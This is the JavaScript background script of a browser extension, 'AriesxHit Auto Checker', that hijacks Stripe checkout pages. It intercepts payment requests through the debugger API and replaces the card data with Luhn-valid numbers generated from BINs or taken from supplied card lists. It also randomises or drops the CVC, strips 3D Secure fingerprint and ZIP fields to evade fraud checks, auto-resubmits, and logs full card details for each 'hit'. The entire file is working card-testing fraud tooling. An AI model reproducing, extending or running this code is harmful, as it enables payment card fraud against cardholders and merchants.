// ===================================
// BACKGROUND.JS
// Main Service Worker - Debugger API
// AriesxHit Auto Checker v2
// ===================================

// ==================== STATE MANAGEMENT ====================

let state = {
  bin: '',
  binList: [],
  cardList: [],
  currentBinIndex: 0,
  userClickedSubmit: false,
  retryInProgress: false,
  autoHitActive: false,
  bypassActive: false,
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  permissions: null,
  settings: {
    cvcModifier: 'generate',  // 'remove', 'generate', 'nothing', 'custom'
    customCvc: '',
    remove3dsFingerprint: true,
    removePaymentAgent: false,
    removeZipCode: false,
    blockAnalytics: false
  }
};

// Tab tracking
const tabCardIndexMap = new Map();
const tabCardDetailsMap = new Map();
const tabSuccessUrlMap = new Map();
const debuggerAttachedTabs = new Set();
const tabCheckoutType = new Map(); // '2d' or '3d'

// ==================== CARD GENERATOR ====================

const CardGen = {
  generateFromBin(binInput) {
    if (!binInput) return null;
    
    binInput = binInput.trim();
    const parts = binInput.split('|');
    const binPattern = parts[0].trim();
    const expMonth = parts[1] ? parts[1].trim() : null;
    const expYear = parts[2] ? parts[2].trim() : null;
    const cvvPattern = parts[3] ? parts[3].trim() : null;

    let pattern = binPattern.replace(/[^0-9xX]/g, '');
    
    // Pad to 16 if needed
    if (pattern.length < 16) {
      pattern = pattern + 'x'.repeat(16 - pattern.length);
    }

    let cardNumber = '';
    for (let i = 0; i < Math.min(pattern.length, 16); i++) {
      const char = pattern[i];
      if (char.toLowerCase() === 'x') {
        cardNumber += Math.floor(Math.random() * 10).toString();
      } else {
        cardNumber += char;
      }
    }

    // Fix Luhn
    cardNumber = this.fixLuhn(cardNumber);

    const month = this.genMonth(expMonth);
    const year = this.genYear(expYear);
    const cvv = this.genCvv(cvvPattern);

    return { number: cardNumber, month, year, cvv };
  },

  fixLuhn(cardNumber) {
    const digits = cardNumber.split('').map(Number);
    const len = digits.length;
    
    let sum = 0;
    for (let i = 0; i < len - 1; i++) {
      let digit = digits[i];
      if ((len - 1 - i) % 2 === 1) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
    }

    const checkDigit = (10 - (sum % 10)) % 10;
    return cardNumber.slice(0, -1) + checkDigit.toString();
  },

  genMonth(month) {
    if (month && /^\d{1,2}$/.test(month)) {
      const m = parseInt(month, 10);
      if (m >= 1 && m <= 12) {
        return m.toString().padStart(2, '0');
      }
    }
    return (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0');
  },

  genYear(year) {
    const currentYear = new Date().getFullYear();
    if (year && /^\d{2,4}$/.test(year)) {
      let y = parseInt(year, 10);
      if (y < 100) y += 2000;
      if (y >= currentYear) {
        return (y % 100).toString().padStart(2, '0');
      }
    }
    const randomYear = currentYear + Math.floor(Math.random() * 5) + 1;
    return (randomYear % 100).toString().padStart(2, '0');
  },

  genCvv(pattern) {
    if (pattern && /^\d{3,4}$/.test(pattern)) {
      return pattern;
    }
    let cvv = '';
    for (let i = 0; i < 3; i++) {
      cvv += Math.floor(Math.random() * 10).toString();
    }
    return cvv;
  },

  genRandomCvv() {
    return Math.floor(100 + Math.random() * 900).toString();
  }
};

// ==================== INITIALIZATION ====================

// Load state from storage
chrome.storage.local.get([
  'logs', 'stats', 'permissions', 'bin', 'binList', 'cardList',
  'settings_cvcModifier', 'settings_customCvc', 
  'settings_remove3dsFingerprint', 'settings_removePaymentAgent',
  'settings_removeZipCode', 'settings_blockAnalytics'
], (result) => {
  if (result.logs) state.logs = result.logs;
  if (result.stats) state.stats = result.stats;
  if (result.permissions) state.permissions = result.permissions;
  if (result.bin) state.bin = result.bin;
  if (result.binList) state.binList = result.binList;
  if (result.cardList) state.cardList = result.cardList;
  
  // Load settings
  if (result.settings_cvcModifier) state.settings.cvcModifier = result.settings_cvcModifier;
  if (result.settings_customCvc) state.settings.customCvc = result.settings_customCvc;
  if (result.settings_remove3dsFingerprint !== undefined) state.settings.remove3dsFingerprint = result.settings_remove3dsFingerprint;
  if (result.settings_removePaymentAgent !== undefined) state.settings.removePaymentAgent = result.settings_removePaymentAgent;
  if (result.settings_removeZipCode !== undefined) state.settings.removeZipCode = result.settings_removeZipCode;
  if (result.settings_blockAnalytics !== undefined) state.settings.blockAnalytics = result.settings_blockAnalytics;
  
  console.log('[Background] State loaded');
});

// Listen for storage changes
chrome.storage.onChanged.addListener((changes, area) => {
  if (changes.bin) state.bin = changes.bin.newValue || '';
  if (changes.binList) state.binList = changes.binList.newValue || [];
  if (changes.cardList) state.cardList = changes.cardList.newValue || [];
  if (changes.settings_cvcModifier) state.settings.cvcModifier = changes.settings_cvcModifier.newValue;
  if (changes.settings_customCvc) state.settings.customCvc = changes.settings_customCvc.newValue;
  if (changes.settings_remove3dsFingerprint) state.settings.remove3dsFingerprint = changes.settings_remove3dsFingerprint.newValue;
  if (changes.settings_removePaymentAgent) state.settings.removePaymentAgent = changes.settings_removePaymentAgent.newValue;
  if (changes.settings_removeZipCode) state.settings.removeZipCode = changes.settings_removeZipCode.newValue;
  if (changes.settings_blockAnalytics) state.settings.blockAnalytics = changes.settings_blockAnalytics.newValue;
});

// Open in new tab when extension icon is clicked
chrome.action.onClicked.addListener(async () => {
  const tabs = await chrome.tabs.query({ url: chrome.runtime.getURL('popup.html') });
  if (tabs.length > 0) {
    chrome.tabs.update(tabs[0].id, { active: true });
    chrome.windows.update(tabs[0].windowId, { focused: true });
  } else {
    const authData = await chrome.storage.local.get(['auth_token', 'user_data']);
    if (authData.auth_token && authData.user_data) {
      chrome.tabs.create({ url: chrome.runtime.getURL('popup.html') });
    } else {
      chrome.tabs.create({ url: chrome.runtime.getURL('login.html') });
    }
  }
});

// ==================== TAB MANAGEMENT ====================

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url && (tab.url.includes('cs_live') || tab.url.includes('buy.stripe.com') || tab.url.includes('checkout.stripe.com'))) {
    injectContentScripts(tabId);
    if (!debuggerAttachedTabs.has(tabId)) {
      attachDebugger(tabId);
    }
  }
  
  // Check for success URL navigation
  if (changeInfo.status === 'complete' && tab.url) {
    const successUrl = tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      handleSuccessNavigation(tabId, tab.url);
    }
  }
});

chrome.tabs.onActivated.addListener((activeInfo) => {
  chrome.tabs.get(activeInfo.tabId, (tab) => {
    if (chrome.runtime.lastError || !tab) return;
    
    if (tab.url && (tab.url.includes('cs_live') || tab.url.includes('buy.stripe.com') || tab.url.includes('checkout.stripe.com'))) {
      injectContentScripts(tab.id);
      if (!debuggerAttachedTabs.has(tab.id)) {
        attachDebugger(tab.id);
      }
    }
  });
});

chrome.tabs.onRemoved.addListener((tabId) => {
  if (debuggerAttachedTabs.has(tabId)) {
    chrome.debugger.detach({ tabId }, () => {
      debuggerAttachedTabs.delete(tabId);
      tabCardIndexMap.delete(tabId);
      tabCardDetailsMap.delete(tabId);
      tabSuccessUrlMap.delete(tabId);
      tabCheckoutType.delete(tabId);
    });
  }
});

function injectContentScripts(tabId) {
  chrome.scripting.executeScript({
    target: { tabId, allFrames: true },
    files: ['scripts/content/stripe-detector.js', 'scripts/content/form-injector.js']
  }, () => {
    if (chrome.runtime.lastError) {
      console.log('[Background] Script injection error:', chrome.runtime.lastError);
    }
  });
}

// ==================== DEBUGGER API ====================

function attachDebugger(tabId) {
  if (debuggerAttachedTabs.has(tabId)) return;
  
  chrome.debugger.attach({ tabId }, '1.3', () => {
    if (chrome.runtime.lastError) {
      console.log('[Background] Debugger attach error:', chrome.runtime.lastError);
      return;
    }
    
    debuggerAttachedTabs.add(tabId);
    
    // Enable Fetch interception
    chrome.debugger.sendCommand({ tabId }, 'Fetch.enable', {
      patterns: [{ urlPattern: '*' }]
    });
    
    // Enable Network monitoring
    chrome.debugger.sendCommand({ tabId }, 'Network.enable', {});
    
    console.log('[Background] Debugger attached to tab:', tabId);
    addLog({ type: 'info', message: '🔗 Connected to checkout', timestamp: Date.now() });
  });
}

chrome.debugger.onEvent.addListener((source, method, params) => {
  if (!source.tabId || !debuggerAttachedTabs.has(source.tabId)) return;
  
  const tabId = source.tabId;
  
  if (method === 'Fetch.requestPaused') {
    handleRequestPaused(tabId, params);
  } else if (method === 'Network.responseReceived') {
    handleResponseReceived(tabId, params);
  }
});

// ==================== REQUEST INTERCEPTION ====================

async function handleRequestPaused(tabId, params) {
  const requestId = params.requestId;
  const request = params.request;
  const url = request.url;
  const method = request.method;
  
  // Check if this is a Stripe payment_methods request
  if (url.includes('stripe.com/v1/payment_methods') && method === 'POST' && request.postData) {
    
    // Only intercept if bypass mode is active
    if (!state.bypassActive && !state.autoHitActive) {
      continueRequest(tabId, requestId);
      return;
    }
    
    const card = await getCardForTab(tabId);
    
    if (!card) {
      addLog({ type: 'error', message: '🔚 No more cards available', timestamp: Date.now() });
      sendNotificationToTab(tabId, '🔚 Card list ended', 'error');
      continueRequest(tabId, requestId);
      return;
    }
    
    // Parse and modify the request body
    let params_body = new URLSearchParams(request.postData);
    
    // Set card data
    params_body.set('card[number]', card.number);
    params_body.set('card[exp_month]', card.month);
    params_body.set('card[exp_year]', card.year);
    
    // Handle CVC based on settings
    const cvcValue = applyCvcModifier(card.cvv);
    if (cvcValue !== null) {
      params_body.set('card[cvc]', cvcValue);
    } else {
      params_body.delete('card[cvc]');
    }
    
    // Apply 3DS fingerprint bypass
    if (state.settings.remove3dsFingerprint) {
      apply3dsBypass(params_body);
    }
    
    // Remove payment agent if enabled
    if (state.settings.removePaymentAgent) {
      removePaymentAgent(params_body);
    }
    
    // Remove ZIP code if enabled
    if (state.settings.removeZipCode) {
      removeZipCode(params_body);
    }
    
    const modifiedBody = params_body.toString();
    
    // Prepare headers
    let headers = { ...request.headers };
    headers['Content-Length'] = modifiedBody.length.toString();
    headers['Content-Type'] = 'application/x-www-form-urlencoded';
    
    const headersArray = headersObjectToArray(headers);
    const bodyBase64 = btoa(unescape(encodeURIComponent(modifiedBody)));
    
    // Send modified request
    chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', {
      requestId,
      method,
      postData: bodyBase64,
      headers: headersArray
    }, () => {
      // Store card details for this tab
      tabCardDetailsMap.set(tabId, card);
      
      // Log the card used
      const cvcModeName = getCvcModifierName();
      const fullCard = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
      addLog({ type: 'info', message: `💳 ${fullCard} (gen) [CVC: ${cvcModeName}]`, timestamp: Date.now() });
      
      // Send notification to content
      sendNotificationToTab(tabId, `💳 Testing: ${card.number.slice(0,6)}******${card.number.slice(-4)}`, 'info');
      
      // Update stats
      state.stats.tested++;
      chrome.storage.local.set({ stats: state.stats });
      
      // Proceed to retry
      proceedToRetry(tabId);
    });
    
  } else {
    // Continue request normally
    continueRequest(tabId, requestId);
  }
}

function continueRequest(tabId, requestId) {
  chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', { requestId });
}

// ==================== RESPONSE HANDLING ====================

function handleResponseReceived(tabId, params) {
  const requestId = params.requestId;
  const response = params.response;
  const url = response.url;
  const contentType = response.headers['content-type'] || response.headers['Content-Type'] || '';
  
  if (!url.includes('api.stripe.com')) return;
  if (!contentType.includes('application/json')) return;
  
  chrome.debugger.sendCommand({ tabId }, 'Network.getResponseBody', { requestId }, (result) => {
    if (result && result.body) {
      let body = result.base64Encoded ? atob(result.body) : result.body;
      
      try {
        const data = JSON.parse(body);
        processStripeResponse(tabId, data);
      } catch (e) {
        console.log('[Background] Error parsing response:', e);
      }
    }
    
    proceedToRetry(tabId);
  });
}

function processStripeResponse(tabId, data) {
  let isSuccess = false;
  let successUrl = 'N/A';
  
  // Check for success URL
  if (data.success_url) {
    successUrl = data.success_url;
    tabSuccessUrlMap.set(tabId, successUrl);
  }
  
  // Check for 3D Secure
  if (data.status === 'requires_action' || data.next_action) {
    tabCheckoutType.set(tabId, '3d');
    addLog({ type: 'warning', message: '🔐 Stripe: 3D Secure Required', timestamp: Date.now() });
    sendNotificationToTab(tabId, '🔐 3D Secure Required', 'warning');
    
    // Notify content script to update notification
    chrome.tabs.sendMessage(tabId, { type: 'UPDATE_CHECKOUT_TYPE', checkoutType: '3d' }).catch(() => {});
    return;
  }
  
  // Check for errors
  if (data.error) {
    const error = data.error;
    const code = error.decline_code || error.code || 'unknown';
    const message = error.message || 'Card declined';
    
    addLog({ type: 'error', message: `❌ Stripe: ${code}`, timestamp: Date.now() });
    sendNotificationToTab(tabId, `❌ ${code}`, 'error');
    
    state.stats.declined++;
    chrome.storage.local.set({ stats: state.stats });
    return;
  }
  
  // Check payment_intent errors
  if (data.payment_intent && data.payment_intent.last_payment_error) {
    const error = data.payment_intent.last_payment_error;
    const code = error.decline_code || error.code || 'unknown';
    
    addLog({ type: 'error', message: `❌ Stripe: ${code}`, timestamp: Date.now() });
    sendNotificationToTab(tabId, `❌ ${code}`, 'error');
    
    state.stats.declined++;
    chrome.storage.local.set({ stats: state.stats });
    return;
  }
  
  // Check for success
  if (data.status && (data.status.toLowerCase() === 'succeeded' || data.status.toLowerCase() === 'success')) {
    isSuccess = true;
  }
  
  if (isSuccess) {
    handlePaymentSuccess(tabId, successUrl);
  }
}

function handlePaymentSuccess(tabId, successUrl) {
  const card = tabCardDetailsMap.get(tabId);
  
  addLog({ type: 'success', message: '✅ Stripe: Payment Successful', timestamp: Date.now() });
  addLog({ type: 'success', message: '🎉 HIT DETECTED', timestamp: Date.now() });
  
  if (card) {
    const fullCard = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
    addLog({ type: 'success', message: `💎 ${fullCard}`, timestamp: Date.now() });
    tabCardDetailsMap.delete(tabId);
  }
  
  sendNotificationToTab(tabId, '🎉 Payment Success!', 'success');
  
  state.stats.hits++;
  state.userClickedSubmit = false;
  tabSuccessUrlMap.delete(tabId);
  
  chrome.storage.local.set({ stats: state.stats });
  broadcastToPopup({ type: 'STATS_UPDATE', hits: state.stats.hits });
  broadcastToPopup({ type: 'MODE_UPDATE', mode: 'HIT!' });
}

function handleSuccessNavigation(tabId, url) {
  const card = tabCardDetailsMap.get(tabId);
  
  if (card) {
    handlePaymentSuccess(tabId, url);
  }
}

// ==================== CARD MANAGEMENT ====================

async function getCardForTab(tabId) {
  // If using card list
  if (state.cardList && state.cardList.length > 0) {
    let cardIndex = tabCardIndexMap.get(tabId) || 0;
    
    if (cardIndex >= state.cardList.length) {
      return null; // Card list ended
    }
    
    const cardData = state.cardList[cardIndex];
    const [number, month, year, cvv] = cardData.split('|');
    
    tabCardIndexMap.set(tabId, cardIndex + 1);
    
    return { number, month, year, cvv };
  }
  
  // If using BIN list
  if (state.binList && state.binList.length > 0) {
    const bin = state.binList[state.currentBinIndex % state.binList.length];
    state.currentBinIndex++;
    return CardGen.generateFromBin(bin);
  }
  
  // If using single BIN
  if (state.bin) {
    return CardGen.generateFromBin(state.bin);
  }
  
  return null;
}

// ==================== CVC MODIFIER ====================

function applyCvcModifier(originalCvv) {
  switch (state.settings.cvcModifier) {
    case 'remove':
      return null; // Will delete CVC from request
    case 'generate':
      return CardGen.genRandomCvv();
    case 'custom':
      return state.settings.customCvc || originalCvv;
    case 'nothing':
    default:
      return originalCvv;
  }
}

function getCvcModifierName() {
  const names = {
    'remove': 'Remove',
    'generate': 'Generate',
    'nothing': 'Nothing',
    'custom': 'Custom'
  };
  return names[state.settings.cvcModifier] || state.settings.cvcModifier;
}

// ==================== 3DS BYPASS ====================

function apply3dsBypass(params) {
  // Look for three_d_secure[device_data]
  for (const [key, value] of params) {
    if (key.includes('three_d_secure') && key.includes('device_data')) {
      try {
        let decoded = decodeURIComponent(value);
        let jsonStr = atob(decoded);
        let obj = JSON.parse(jsonStr);
        
        // Remove fingerprint fields
        delete obj.browser_locale;
        delete obj.timezone;
        delete obj.user_agent;
        delete obj.screen_width;
        delete obj.screen_height;
        delete obj.color_depth;
        delete obj.language;
        delete obj.java_enabled;
        delete obj.javascript_enabled;
        delete obj.time_zone;
        
        let newJson = JSON.stringify(obj);
        let newBase64 = btoa(newJson);
        let newEncoded = encodeURIComponent(newBase64);
        
        params.set(key, newEncoded);
        console.log('[Background] 3DS fingerprint removed');
      } catch (e) {
        console.log('[Background] Error processing 3DS data:', e);
      }
      break;
    }
  }
}

function removePaymentAgent(params) {
  const keysToRemove = [
    'payment_user_agent',
    'referrer',
    'client_attribution_metadata[client_session_id]',
    'client_attribution_metadata[merchant_integration_source]',
    'client_attribution_metadata[merchant_integration_subtype]',
    'client_attribution_metadata[merchant_integration_version]'
  ];
  
  keysToRemove.forEach(key => params.delete(key));
}

function removeZipCode(params) {
  const keysToRemove = [
    'billing_details[address][postal_code]',
    'card[address_zip]',
    'payment_method_data[billing_details][address][postal_code]'
  ];
  
  keysToRemove.forEach(key => params.delete(key));
}

// ==================== RETRY LOGIC ====================

function proceedToRetry(tabId) {
  if (state.userClickedSubmit && !state.retryInProgress) {
    state.retryInProgress = true;
    
    setTimeout(() => {
      chrome.tabs.sendMessage(tabId, {
        type: 'trigger_retry',
        selector: '.SubmitButton'
      }, () => {
        state.retryInProgress = false;
      });
    }, 2000);
  }
}

// ==================== UTILITIES ====================

function headersObjectToArray(headers) {
  let arr = [];
  for (let name in headers) {
    if (headers.hasOwnProperty(name)) {
      arr.push({ name, value: headers[name].toString() });
    }
  }
  return arr;
}

function sendNotificationToTab(tabId, message, type = 'info') {
  chrome.tabs.sendMessage(tabId, {
    type: 'show_notification',
    message,
    messageType: type
  }).catch(() => {});
}

function broadcastToPopup(message) {
  chrome.runtime.sendMessage(message).catch(() => {});
}

// ==================== LOGGING ====================

function addLog(log) {
  state.logs.push(log);
  
  if (state.logs.length > 500) {
    state.logs.shift();
  }
  
  chrome.storage.local.set({ logs: state.logs });
  
  broadcastToPopup({
    type: 'LOG_UPDATE',
    logType: log.type,
    message: log.message
  });
}

function clearLogs() {
  state.logs = [];
  chrome.storage.local.set({ logs: [] });
}

// ==================== MESSAGE HANDLING ====================

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  handleMessage(message, sender, sendResponse);
  return true;
});

async function handleMessage(message, sender, sendResponse) {
  switch (message.type) {
    case 'user_clicked_submit':
      state.userClickedSubmit = true;
      console.log('[Background] User clicked submit');
      sendResponse({ success: true });
      break;
      
    case 'START_AUTO_HIT':
      state.autoHitActive = true;
      state.cardList = message.data?.cards || [];
      tabCardIndexMap.clear();
      addLog({ type: 'success', message: `🚀 Auto Hit started with ${state.cardList.length} cards`, timestamp: Date.now() });
      sendResponse({ success: true });
      break;
      
    case 'STOP_AUTO_HIT':
      state.autoHitActive = false;
      addLog({ type: 'info', message: '⏹️ Auto Hit stopped', timestamp: Date.now() });
      sendResponse({ success: true });
      break;
      
    case 'START_BYPASS':
      state.bypassActive = true;
      if (message.data?.bins) {
        state.binList = message.data.bins;
        state.currentBinIndex = 0;
        chrome.storage.local.set({ binList: state.binList });
      }
      addLog({ type: 'success', message: `🔓 Bypass enabled [CVC: ${getCvcModifierName()}]`, timestamp: Date.now() });
      sendResponse({ success: true });
      break;
      
    case 'STOP_BYPASS':
      state.bypassActive = false;
      addLog({ type: 'info', message: '⏹️ Bypass disabled', timestamp: Date.now() });
      sendResponse({ success: true });
      break;
      
    case 'SET_BIN_LIST':
      if (typeof message.bins === 'string') {
        state.binList = message.bins.split('\n').map(b => b.trim()).filter(b => b.length >= 6);
      } else if (Array.isArray(message.bins)) {
        state.binList = message.bins;
      }
      state.currentBinIndex = 0;
      chrome.storage.local.set({ binList: state.binList });
      addLog({ type: 'info', message: `📋 ${state.binList.length} BIN patterns loaded`, timestamp: Date.now() });
      sendResponse({ success: true, count: state.binList.length });
      break;
      
    case 'UPDATE_SETTINGS':
      Object.assign(state.settings, message.settings);
      const toStore = {};
      Object.keys(message.settings).forEach(key => {
        toStore[`settings_${key}`] = message.settings[key];
      });
      chrome.storage.local.set(toStore);
      sendResponse({ success: true });
      break;
      
    case 'GET_SETTINGS':
      sendResponse({ settings: state.settings });
      break;
      
    case 'GET_LOGS':
      sendResponse({ logs: state.logs, stats: state.stats });
      break;
      
    case 'CLEAR_LOGS':
      clearLogs();
      sendResponse({ success: true });
      break;
      
    case 'GET_STATS':
      sendResponse(state.stats);
      break;
      
    case 'GET_AUTO_HIT_STATE':
      sendResponse({ active: state.autoHitActive });
      break;
      
    case 'GET_BYPASS_STATE':
      sendResponse({ active: state.bypassActive });
      break;
      
    case 'CHECKOUT_DETECTED':
      const checkoutType = message.checkoutType || '2d';
      if (sender.tab) {
        tabCheckoutType.set(sender.tab.id, checkoutType);
      }
      addLog({ type: 'info', message: `🔍 ${checkoutType.toUpperCase()} Checkout Detected`, timestamp: Date.now() });
      sendResponse({ success: true });
      break;
      
    case '3DS_DETECTED':
      if (sender.tab) {
        tabCheckoutType.set(sender.tab.id, '3d');
      }
      addLog({ type: 'warning', message: '🔒 3D Secure Detected', timestamp: Date.now() });
      sendResponse({ success: true });
      break;
      
    default:
      sendResponse({ error: 'Unknown message type' });
  }
}

// ==================== PERMISSION CHECK ====================

async function checkPermission(feature) {
  const permissions = await chrome.storage.local.get('permissions');
  if (!permissions || !permissions.permissions) return false;
  return permissions.permissions[feature] === true;
}

console.log('[AriesxHit] Background Service Worker Ready - Debugger API');
